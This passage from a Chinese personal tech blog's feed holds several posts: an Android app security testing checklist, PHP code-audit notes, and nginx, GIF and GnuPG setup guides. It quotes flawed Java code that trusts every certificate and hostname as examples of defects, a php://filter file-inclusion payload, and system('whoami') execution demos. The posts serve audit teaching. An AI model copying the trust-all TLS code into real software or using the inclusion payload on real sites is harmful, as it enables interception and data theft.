若截获的数据包中证书由可信任机构签发，且在有效期内，且访问服务器与证书绑定的一致，同时只接受信任的CA签名证书，则通过测试</p></li><li><p>修复建议</p><p> 客户端验证远程端点的X.509证书，只接受受信任的CA签名的证书</p></li></ol><p><a id="org090d933"></a></p><h3 id="证书校验检测"><a href="#证书校验检测" class="headerlink" title="证书校验检测"></a>证书校验检测</h3><ol><li><p>检测目的</p><p> 检测客户端和服务器是否对证书进行双向校验</p></li><li><p>检测方法</p><ol><li>反编译App代码，检测是否存在客户端验证服务器端证书的代码<ul><li>  验证证书内容有效性、数字摘要是否一致</li></ul></li><li> 反编译App代码，检测是否存在客户端发送本地证书给服务器端认证的代码</li></ol></li><li><p>检测结论</p><p> 若客户端对服务器端返回的证书进行了验证，同时服务器端也对客户端证书进行了校验，则通过测试</p></li><li><p>修复建议</p><p> 建议一般的App要实现客户端对服务器端证书的单向验证，对于安全要求比较高的App，要实现客户端与服务器端证书的双向验证</p></li></ol><p><a id="org467e66d"></a></p><h3 id="主机名校验"><a href="#主机名校验" class="headerlink" title="主机名校验"></a>主机名校验</h3><ol><li><p>检测目的</p><p> 检测客户端是否对主机名进行校验</p></li><li><p>检测方法</p><p> 反编译App代码，查找App通信的代码，查看 <code>setHostnameVerifier()</code> 方法接受任意域名还是进行了主机名验证</p><pre><code> public static SSLSocketFactory getFixedSocketFactory()&#123;     MySSLSocketFactory v0;     try&#123;         v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore());         //缺陷代码         ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);     &#125;catch(Throwable v1)&#123;         v1.printStackTrace();         SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory();     &#125;     return ((SSLSocketFactory)v0); &#125;</code></pre></li><li><p>检测结论</p><p> 若App接受任意域名，则本项测试 <strong>不通过</strong></p></li><li><p>修复建议</p><p> App对主机名进行校验，不能接受任意域名</p></li></ol><p><a id="org764d1f9"></a></p><h2 id="数据加密检测-1"><a href="#数据加密检测-1" class="headerlink" title="数据加密检测"></a>数据加密检测</h2><p><a id="org9f7544e"></a></p><h3 id="检测目的-1"><a href="#检测目的-1" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测在客户端与服务器端通信过程中，业务数据是否以明文方式在网络中传输，数据加密的复杂度如何</p><p><a id="orgb800ad3"></a></p><h3 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h3><ol><li> 对客户端与服务器端通信的登陆、支付、转账等核心功能进行抓包，查看业务数据是否以明文方式在网络中传输</li><li> 检测数据加密方式的复杂度，url编码、Base64编码、AES\DES加密等</li></ol><p><a id="orgbdb1f45"></a></p><h3 id="检测结论-1"><a href="#检测结论-1" class="headerlink" title="检测结论"></a>检测结论</h3><p>若客户端与服务器端交互的业务数据经过多个复杂的算法加密，且无法破解，则通过测试</p><p><a id="orgace36cd"></a></p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>客户端与服务器端交互的上行/下行数据要经过多个复杂算法进行加密，同时加密存储对称加密算法密钥</p><p><a id="org30371d5"></a></p><h2 id="中间人攻击测试"><a href="#中间人攻击测试" class="headerlink" title="中间人攻击测试"></a>中间人攻击测试</h2><p><a id="orgb561cf4"></a></p><h3 id="HTTP中间人会话劫持检测"><a href="#HTTP中间人会话劫持检测" class="headerlink" title="HTTP中间人会话劫持检测"></a>HTTP中间人会话劫持检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器端交互的数据是否可以被任意篡改，导致重放攻击漏洞</p></li><li><p>检测方法</p><p> 运行测试App，点击登陆，拦截数据包，并进行修改后放行，查看App运行结果是否能够修改成功</p></li><li><p>检测结论</p><p> 若客户端与服务器端交互的数据经过加密处理，且数据无法修改，则通过测试</p></li><li><p>修复建议</p><ul><li>  采用高强度的加密算法对交互数据进行加密/或使用HTTPS</li><li>  对客户端请求的数据和服务器端返回的数据进行完整性校验，防止被篡改</li></ul></li></ol><p><a id="org493ff20"></a></p><h3 id="HTTPS中间人会话劫持检测"><a href="#HTTPS中间人会话劫持检测" class="headerlink" title="HTTPS中间人会话劫持检测"></a>HTTPS中间人会话劫持检测</h3><ol><li><p>检测目的</p><p> 检测App在使用HTTPS时，是否存在中间人攻击漏洞</p></li><li><p>检测方法</p><ol><li><p>反编译源码，查看是否校验服务器端是否可信- 查看实现X509TrustManager接口中 <code>checkServerTrusted()</code> 方法实现是否为空</p><pre><code> public MySSLSocketFactory(KeyStore truststore) throws NoSuchAlgorithmException,                                                       KeyManagementException&#123;     this.sslContext = SSLContext.getInstance(&quot;TLS&quot;);     this.sslContext.init(null,new TrustManager[]&#123;new X509TrustManager()&#123;             public X509Certificate[] getAcceptedIssuers()&#123;                 return null;             &#125;             public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException&#123;                 //实现逻辑为空             &#125;             public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException&#123;                 //实现逻辑为空             &#125;         &#125;&#125;,null); &#125;</code></pre></li><li><p>反编译源码，查看站点域名与站点证书的域名是否匹配- 查看 <code>HostnameVerifier()</code> 方法中的 <code>verify()</code> 函数是否存在域名校验</p><p> NetworkUtils.conn=null;<br> NetworkUtils.is =null;<br> NetworkUtils.os=null;<br> NetowrkUtils.DO_NOT_VERIFY = new HostanmeVerifier(){</p><pre><code>     public boolean verify(String s, SSLSession sslSession)&#123;         return 1; // 不检查站点域名和站点证书的域名     &#125; &#125;</code></pre></li><li><p>查看 <code>sethostnameverifier()</code> 方法是否接受任意域名</p><pre><code> public static SSLSocketFactory getFixedSocketFactory()&#123;     MySSLSocketFactory v0;     try&#123;         v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore());         //缺陷代码         ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);     &#125;catch(Throwable v1)&#123;         v1.printStackTrace();         SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory();     &#125;     return null; &#125;</code></pre></li></ol></li><li><p>检测结论</p><p> 若客户端不进行服务器端是否可信、不进行域名校验、接受任意域名，对APP数据包进行拦截和篡改，则造成中间人攻击的风险。<br> 若客户端对服务器端返回的SSL证书进行强校验，则通过测试</p></li><li><p>修复建议</p><p> 对SSL证书进行签名CA是否合法、证书是否自签名、主机域名是否匹配、证书是否过期等校验。</p></li></ol><p><a id="org5b71f45"></a></p><h1 id="App加固技术"><a href="#App加固技术" class="headerlink" title="App加固技术"></a>App加固技术</h1><ol><li><p>第一代加固技术： 通过对源码进行</p><ul><li>  压缩： 检测并一处代码中无用的类、字段、方法和特性</li><li>  优化： 对字节码进行优化，移除无用指令</li><li>  混淆： 使用a、b、c、d等无意义字符对类、字段、方法进行重命名</li><li>  预检： 在Java平台上对处理后的代码进行预检，确保加载的class文件时可执行</li></ul></li><li><p> 第二代加固技术： 对原始App的dex文件加密，并外包一层克，将App的核心代码进行隐藏</p></li><li><p> 第三代加固技术： 对dex文件中所有的类及方法函数内容进行抽取、加密和隐藏，单独加密后存放在apk中的特定文件内</p></li><li><p> 第四代加固技术： DVMP(dex虚拟机保护) 具有自定义虚拟机、指令集和解释器，未保护的代码在系统虚拟机中运行，保护代码在自定义虚拟机运行</p></li></ol><h1 id="Table-of-Contents-1"><a href="#Table-of-Contents-1" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org775b335">应用脱壳</a><ol><li> <a href="#org8b17b93">安装Frida客户端</a></li></ol></li></ol><p><a id="org775b335"></a></p><h1 id="应用脱壳"><a href="#应用脱壳" class="headerlink" title="应用脱壳"></a>应用脱壳</h1><p><a id="org8b17b93"></a></p><h2 id="安装Frida客户端"><a href="#安装Frida客户端" class="headerlink" title="安装Frida客户端"></a>安装Frida客户端</h2><ol><li><p>在Android上安装<a href="https://github.com/frida/frida/releases">Frida Server</a></p><pre><code> adb shell getprop ro.build.version.release     # 获取Android版本号 adb shell getprop ro.product.cpu.abi           # 查看CPU架构,根据架构下载对应的frida-server-14.2.18-android-arm64.xz xz -d frida-server-14.2.18-android-arm64.xz    # 解压frida-server adb push frida-server-14.2.18-android-arm64 /data/local/tmp      # 传输到/data/local/tmp目录下 adb shell su chmod a+x /data/local/tmp/frida-server-14.2.18-android-arm64 adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 ./frida-server-14.2.18-android-arm64 python dexDump.py com.test.aspiredoctor</code></pre></li><li><p>在macOS上安装Frida Client</p><pre><code> pip3 install frida frida-tools</code></pre></li></ol><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> 替换Android系统/system/bin/app<sub>process文件</sub></p><p><sup><a id="fn.2" href="#fnr.2">2</a></sup> 如apk文件和dex文件</p><p><sup><a id="fn.3" href="#fnr.3">3</a></sup> 可导致调用系统功能截取屏幕和录像窃取用户信息，界面劫持，对用户进行钓鱼</p><p><sup><a id="fn.4" href="#fnr.4">4</a></sup> 检测客户端程序是否对已经root的android系统、模拟器和逆向框架进行检测</p><p><sup><a id="fn.5" href="#fnr.5">5</a></sup> 检测客户端程序是否进行代码加密、代码混淆和代码加固，是否易被逆向并泄露程序的设计原理和运行流程</p><p><sup><a id="fn.6" href="#fnr.6">6</a></sup> 检测客户程序是否对自身进行校验</p><p><sup><a id="fn.7" href="#fnr.7">7</a></sup> 检测客户端程序是否可被外部程序动态调试并输出敏感信息</p><p><sup><a id="fn.8" href="#fnr.8">8</a></sup> 检测客户端程序是否存在进程保护和内存保护，防止被外部程序动态注入so文件到指定进程、以及任意修改、转储内存代码行为</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>如何将视频转化为Gif</title>
    <link href="https://askding.github.io/Tools/%E5%A6%82%E4%BD%95%E5%B0%86%E8%A7%86%E9%A2%91%E8%BD%AC%E5%8C%96%E4%B8%BAGif.html"/>
    <id>https://askding.github.io/Tools/%E5%A6%82%E4%BD%95%E5%B0%86%E8%A7%86%E9%A2%91%E8%BD%AC%E5%8C%96%E4%B8%BAGif.html</id>
    <published>2022-04-11T13:04:13.000Z</published>
    <updated>2022-04-11T13:04:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgc4eb406">How to convert .mov or .mp4 to .gif using the command line</a><ol><li> <a href="#org3e63297">How to convert</a></li></ol></li></ol><p><a id="orgc4eb406"></a></p><h1 id="How-to-convert-mov-or-mp4-to-gif-using-the-command-line"><a href="#How-to-convert-mov-or-mp4-to-gif-using-the-command-line" class="headerlink" title="How to convert .mov or .mp4 to .gif using the command line"></a>How to convert .mov or .mp4 to .gif using the command line</h1><p>Requirements</p><pre><code>brew install ffmpegbrew install gifsicle</code></pre><p><a id="org3e63297"></a></p><h2 id="How-to-convert"><a href="#How-to-convert" class="headerlink" title="How to convert"></a>How to convert</h2><pre><code>ffmpeg -i in.mov -s 600x400 -pix_fmt rgb24 -r 10 -f gif - | gifsicle --optimize=3 --delay=3 &gt; out.gif</code></pre><p>Arguments:</p><pre><code>-r 10 to reduce the frame rate from 25 fps to 10 fps-s 600x400 to determine the output size.--delay=3 to have a delay of 30ms between each gif--optimize=3 to use the most file-size optimized algorithm</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP代码审计</title>
    <link href="https://askding.github.io/Coding/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"/>
    <id>https://askding.github.io/Coding/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html</id>
    <published>2022-04-09T13:05:43.000Z</published>
    <updated>2022-04-09T13:05:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org0fff461">PHP Audit</a><ol><li> <a href="#org8eab023">代码审计常见思路</a></li><li> <a href="#orgd90071d">Untrusted Data ,使用不可信的数据</a></li><li> <a href="#org593992a">Command Execution, 命令执行</a></li><li> <a href="#orgaf7a00a">Code Execution, 代码执行</a></li><li> <a href="#org00773a4">Information Discloure, 信息泄露</a></li><li> <a href="#org9c1cc21">Insecure Cryptographic Functions, 不安全的加密函数</a></li></ol></li><li><a href="#org7fd6349">常见危险函数</a><ol><li> <a href="#orgd42787f">代码执行函数</a></li><li> <a href="#orga4dc3ae">包含函数</a></li><li> <a href="#orgb5e23c0">命令执行函数</a></li><li> <a href="#org7b93cfd">文件操作函数</a></li><li> <a href="#org8ef722f">特殊函数</a></li><li> <a href="#orgabca0d4">变量覆盖</a></li></ol></li></ol><p><a id="org0fff461"></a></p><h1 id="PHP-Audit"><a href="#PHP-Audit" class="headerlink" title="PHP Audit"></a>PHP Audit</h1><p><a href="https://github.com/ripsscanner/rips">RIPS</a>  <a href="https://github.com/nccgroup/VCG">VCG</a></p><p>代码审计本质： <code>unfilter_function(param_input)</code><br>找漏洞 -&gt; 找可以控制的变量(参数)=param<sub>input</sub>= -&gt; 危险函数(param<sub>input</sub>)</p><p>漏洞形成条件：</p><ul><li>  可以控制的变量(外部输入)       &#x2013;&gt;  内因</li><li>  危险(未过滤参数)函数接收外部输入 &#x2013;&gt; 决定漏洞的类型</li></ul><p>隐式输入： 用户传递数据-&gt; 数据库/缓存文件等地方 -&gt; 程序代码处理-&gt;程序代码<br>显式输入： 用户传递数据-&gt; 程序代码处理</p><p><a id="org8eab023"></a></p><h2 id="代码审计常见思路"><a href="#代码审计常见思路" class="headerlink" title="代码审计常见思路"></a>代码审计常见思路</h2><ul><li>  正向追踪： 变量  &#x2013;&gt; 函数</li><li>  逆向追踪： 函数  &#x2013;&gt; 变量</li><li>  常见功能点定向审计</li><li>  第三方组件,中间件版本比对</li><li>  补丁比对，反推漏洞位置</li><li>  工具扫描+人工验证</li></ul><p><a id="orgd90071d"></a></p><h2 id="Untrusted-Data-使用不可信的数据"><a href="#Untrusted-Data-使用不可信的数据" class="headerlink" title="Untrusted Data ,使用不可信的数据"></a>Untrusted Data ,使用不可信的数据</h2><p><code>$_REQUEST</code> 参数中的数据是浏览器可控的，黑客可以通过巧妙的构造覆盖PHP全局参数</p><p><a id="org593992a"></a></p><h2 id="Command-Execution-命令执行"><a href="#Command-Execution-命令执行" class="headerlink" title="Command Execution, 命令执行"></a>Command Execution, 命令执行</h2><p>PHP中存在敏感函数可以执行系统命令，常见这类函数如下：</p><pre><code>execshell_execsystempassthrupopenproc_openpcntl_exec</code></pre><p><a id="orgaf7a00a"></a></p><h2 id="Code-Execution-代码执行"><a href="#Code-Execution-代码执行" class="headerlink" title="Code Execution, 代码执行"></a>Code Execution, 代码执行</h2><p>PHP中存在敏感函数可以执行PHP代码段，常见函数如下：</p><pre><code>evalassertpreg_replacecreate_function</code></pre><p><a id="org00773a4"></a></p><h2 id="Information-Discloure-信息泄露"><a href="#Information-Discloure-信息泄露" class="headerlink" title="Information Discloure, 信息泄露"></a>Information Discloure, 信息泄露</h2><p>常见信息泄露的函数有 <code>phpinfo~、~show_source</code></p><p><a id="org9c1cc21"></a></p><h2 id="Insecure-Cryptographic-Functions-不安全的加密函数"><a href="#Insecure-Cryptographic-Functions-不安全的加密函数" class="headerlink" title="Insecure Cryptographic Functions, 不安全的加密函数"></a>Insecure Cryptographic Functions, 不安全的加密函数</h2><ul><li>  md5</li><li>  CRYPT<sub>STD</sub><sub>DES</sub></li><li>  CRYPT<sub>EXT</sub><sub>DES</sub></li><li>  CRYTPT<sub>MD5等</sub></li></ul><p><a id="org7fd6349"></a></p><h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><p><a id="orgd42787f"></a></p><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><ul><li><p>  <code>eval()</code></p></li><li><p>  <code>assert()</code></p></li><li><p>  <code>preg_replace</code></p></li><li><p>  <code>create_funtion</code></p></li><li><p>  <code>call_user_func</code></p></li><li><p><code>call_user_func_array</code></p><pre><code>  @eval(&#39;echo &quot;test-echo&quot;;&#39;);  echo &#39;&lt;hr&gt;&#39;;  assert(&#39;system(&quot;whoami&quot;)&#39;);  // preg_replace(&quot;/test/e&quot;,&quot;phpinfo();&quot;,&quot;just test&quot;);  echo &#39;&lt;hr&gt;&#39;;  $cfunc=create_function(&#39;$v&#39;,&#39;return system($v);&#39;);  $cfunc(&#39;whoami&#39;);  echo &#39;&lt;hr&gt;&#39;;  $sfunc=&#39;sys&#39;.&#39;tem&#39;;  $sfunc(&#39;whoami&#39;);  echo &#39;&lt;hr&gt;&#39;;  function callback($var)&#123;           echo &quot;call test $var&quot;;  &#125;  call_user_func(&#39;callback&#39;,&#39;crkmyth1cal&#39;);</code></pre></li></ul><p><a id="orga4dc3ae"></a></p><h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><ul><li><p>  <code>require</code></p></li><li><p>  <code>include</code></p></li><li><p>  <code>require_once</code></p></li><li><p><code>include_once</code></p><p>  include $file;</p><p>  include($_GET[‘file’]);<br>  //     ?file=php://filter/convert.base64-encode/resource=index.php</p></li></ul><p><a id="orgb5e23c0"></a></p><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><ul><li><p>  <code>exec</code></p></li><li><p>  <code>system</code></p></li><li><p>  <code>popen</code></p></li><li><p>  <code>proc_open</code></p></li><li><p>  <code>passthru</code></p></li><li><p><code>shell_exec</code></p><p>  echo shell_exec(‘ping <a href="http://www.baidu.com&/#39;">www.baidu.com&#39;</a>);<br>  echo shell_exec(‘whoami’);</p></li></ul><p><a id="org7b93cfd"></a></p><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><p>读取：读取配置文件，获取key<br>写入：写入shell代码<br>删除：删除 <code>.lock</code> 文件，重新安装</p><ul><li><p>  <code>copy</code></p></li><li><p>  <code>file_get_contents</code></p></li><li><p>  <code>file_put_contents</code></p></li><li><p>  <code>file</code></p></li><li><p>  <code>glob</code></p></li><li><p>  <code>fopen</code></p></li><li><p>  <code>move_uploaded_file</code></p></li><li><p>  <code>readfile</code></p></li><li><p>  <code>rename</code></p></li><li><p>  <code>delete</code></p></li><li><p>  <code>rmdir</code></p></li><li><p>  <code>unlink</code></p></li><li><p>  <code>symlink</code></p></li><li><p><code>readlink</code></p><pre><code>  file_put_contents(&quot;baidu.txt&quot;,file_get_contents(&quot;https://www.baidu.com&quot;));  unlink(&#39;baidu.txt&#39;);</code></pre></li></ul><p><a id="org8ef722f"></a></p><h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><ul><li>  <code>phpinfo</code></li><li>  <code>getenv</code></li><li>  <code>putenv</code></li><li>  <code>dl</code></li><li>  <code>ini_get</code></li><li>  <code>ini_set</code></li><li>  <code>ini_alter</code></li><li>  <code>ini_restore</code></li><li>  <code>is_numeric</code></li><li>  <code>in_array</code></li></ul><p><a id="orgabca0d4"></a></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><ul><li>  <code>parse_str</code></li><li>  <code>mb_parse_str</code></li><li>  <code>extract</code></li><li>  <code>import_request_variables</code></li><li>  <code>get_defined_vars</code></li><li>  <code>get_defined_constants</code></li><li>  <code>get_defined_functions</code></li><li>  <code>get_included_files</code></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
    
    
  </entry>
  
  <entry>
    <title>Mac下搭建Nginx+php开发平台</title>
    <link href="https://askding.github.io/Tools/Mac%E4%B8%8B%E6%90%AD%E5%BB%BANginx-php%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0.html"/>
    <id>https://askding.github.io/Tools/Mac%E4%B8%8B%E6%90%AD%E5%BB%BANginx-php%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0.html</id>
    <published>2022-04-07T13:01:16.000Z</published>
    <updated>2022-04-07T13:01:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org5a512c0">软件安装</a><ol><li> <a href="#orge939893">配置路径</a></li></ol></li></ol><p><a id="org5a512c0"></a></p><h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><ul><li><p>  php-fpm : FastCGI进城管理器(mac自带)</p></li><li><p>nginx : 高性能的HTTP和反向代理web服务器</p><pre><code>brew install nginxUpdating Homebrew...==&gt; Downloading from https://pkg-containers.githubusercontent.com/ghcr1/blobs/sha256:8ba34676e573272aa1f73d4dcf6bfddbaa69746a92bf812f6760b######################################################################## 100.0%==&gt; Pouring nginx--1.21.1.big_sur.bottle.tar.gz==&gt; CaveatsDocroot is: /usr/local/var/wwwThe default port has been set in /usr/local/etc/nginx/nginx.conf to 8080 so thatnginx can run without sudo.nginx will load all files in /usr/local/etc/nginx/servers/.To have launchd start nginx now and restart at login:  brew services start nginxOr, if you don&#39;t want/need a background service you can just run:  nginx==&gt; Summary🍺  /usr/local/Cellar/nginx/1.21.1: 25 files, 2.2MB</code></pre><p>  brew services start nginx  # 开机自启nginx</p></li></ul><p><a id="orge939893"></a></p><h2 id="配置路径"><a href="#配置路径" class="headerlink" title="配置路径"></a>配置路径</h2><ul><li><p>  nginx安装路径 <code>/usr/local/Cellar/nginx/1.21.1</code></p></li><li><p>  nginx配置文件 <code>/usr/local/etc/nginx/nginx.conf</code></p></li><li><p>  Docroot <code>/usr/local/var/www</code></p></li><li><p>php-fpm配置文件 <code>/etc/php-fpm.conf.default</code></p><p>  cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf<br>  cp /private/etc/php-fpm.d/<a href="http://www.conf.default/">www.conf.default</a> /private/etc/php-fpm.d/<a href="http://www.conf/">www.conf</a></p></li><li><p>创建error<sub>log文件</sub></p><pre><code>  mkdir /usr/local/var/log/php-fpm  touch /usr/local/var/log/php-fpm/php-fpm.log  //修改php-fpm.conf  error_log = /usr/local/var/log/php-fpm/php-fpm.log</code></pre></li></ul><p>参考：<br><a href="https://segmentfault.com/a/1190000025138860">基于Mac自带nginx,php配置php运行环境</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>GnuPG使用教程</title>
    <link href="https://askding.github.io/Tools/GnuPG%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html"/>
    <id>https://askding.github.io/Tools/GnuPG%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html</id>
    <published>2022-04-05T12:55:25.000Z</published>
    <updated>2022-04-05T12:55:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org99fae5b">Gnu PG基本操作</a><ol><li> <a href="#org93134f5">生成公/私钥</a></li><li> <a href="#org1f0eac3">更改密钥密码</a></li><li> <a href="#org727b018">列出公/私钥</a></li><li> <a href="#org3966672">导出公/私钥</a></li><li> <a href="#org81de83f">导入公/私钥</a></li><li> <a href="#org76bf1ce">验证公钥</a></li><li> <a href="#orgd8946c4">删除公钥/私钥</a></li><li> <a href="#orgaa85092">废除密钥</a></li><li> <a href="#org46449e8">exchange on keyservers</a></li></ol></li><li><a href="#orgc92c582">应用-加解密文件</a><ol><li> <a href="#org0c7f3d4">公钥方式</a></li><li> <a href="#org55024ed">对称密码方法</a></li></ol></li><li><a href="#org101dfb7">应用-数字签名</a><ol><li> <a href="#org02dfb61">私钥创建,公钥验证</a></li></ol></li></ol><p><a id="org99fae5b"></a></p><h1 id="Gnu-PG基本操作"><a href="#Gnu-PG基本操作" class="headerlink" title="Gnu PG基本操作"></a>Gnu PG基本操作</h1><p><code>brew install gpg</code></p><p><a id="org93134f5"></a></p><h2 id="生成公-私钥"><a href="#生成公-私钥" class="headerlink" title="生成公/私钥"></a>生成公/私钥</h2><pre><code>gpg --gen-keygpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc.This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.gpg: directory &#39;/Users/crkmyth1cal/.gnupg&#39; createdgpg: keybox &#39;/Users/crkmyth1cal/.gnupg/pubring.kbx&#39; createdNote: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog.GnuPG needs to construct a user ID to identify your key.Real name: crkmyth1calEmail address: crkmyth1cal@protonmail.comYou selected this USER-ID:    &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot;Change (N)ame, (E)mail, or (O)kay/(Q)uit? OWe need to generate a lot of random bytes. It is a good idea to performsome other action (type on the keyboard, move the mouse, utilize thedisks) during the prime generation; this gives the random numbergenerator a better chance to gain enough entropy.We need to generate a lot of random bytes. It is a good idea to performsome other action (type on the keyboard, move the mouse, utilize thedisks) during the prime generation; this gives the random numbergenerator a better chance to gain enough entropy.gpg: /Users/crkmyth1cal/.gnupg/trustdb.gpg: trustdb createdgpg: key AA72032823A2ECCA marked as ultimately trustedgpg: directory &#39;/Users/crkmyth1cal/.gnupg/openpgp-revocs.d&#39; createdgpg: revocation certificate stored as &#39;/Users/crkmyth1cal/.gnupg/openpgp-revocs.d/CDD514503006241E57352861AA72032823A2ECCA.rev&#39;public and secret key created and signed.pub   ed25519 2021-06-19 [SC] [expires: 2023-06-19]      CDD514503006241E57352861AA72032823A2ECCAuid                      crkmyth1cal 